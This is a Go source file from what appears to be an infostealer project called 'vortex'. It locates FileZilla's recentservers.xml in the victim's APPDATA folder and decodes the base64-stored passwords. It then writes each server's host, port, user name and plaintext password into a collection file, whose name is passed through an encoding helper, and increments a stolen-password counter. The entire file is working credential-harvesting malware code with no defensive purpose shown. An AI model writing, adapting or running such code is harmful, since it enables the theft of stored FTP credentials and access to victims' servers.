package softwares

import (
	"encoding/base64"
	"io"
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"

	"github.com/antchfx/xmlquery"
	"github.com/olekukonko/tablewriter"
)

func FilezillaServersData(mainFolder string) error {
	var out []string

	filezillaPath := filepath.Join(os.Getenv("APPDATA"), "FileZilla\\recentservers.xml")
	if _, err := os.Stat(filezillaPath); err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	filezillaFile := filepath.Join(mainFolder, encrypt.B64Util("filezilla-creds.txt", 0))
	file, err := os.Create(filezillaFile)
	if err != nil {
		return err
	}

	creds := tablewriter.NewWriter(file)

	creds.SetHeader([]string{
		"Host",
		"Port",
		"User",
		"Password",
	})

	xmlFile, err := os.Open(filezillaPath)
	if err != nil {
		return err
	}
	defer xmlFile.Close()

	byteValue, _ := io.ReadAll(xmlFile)

	xmlTags, err := xmlquery.Parse(strings.NewReader(string(byteValue)))
	if err != nil {
		return err
	}

	for _, n := range xmlquery.Find(xmlTags, "//Server") {
		if host := n.SelectElement("Host"); host != nil {
			out = append(out, host.InnerText())
		}
		if port := n.SelectElement("Port"); port != nil {
			out = append(out, port.InnerText())
		}
		if user := n.SelectElement("User"); user != nil {
			out = append(out, user.InnerText())
		}
		if passEncoded := n.SelectElement("Pass"); passEncoded != nil {
			pass, err := base64.StdEncoding.DecodeString(passEncoded.InnerText())
			if err != nil {
				out = append(out, passEncoded.InnerText())
			} else {
				out = append(out, string(pass))
			}
			hutil.PasswordCounter++
		}
		creds.Append(out)
		out = nil
	}
	creds.Render()

	return nil
}
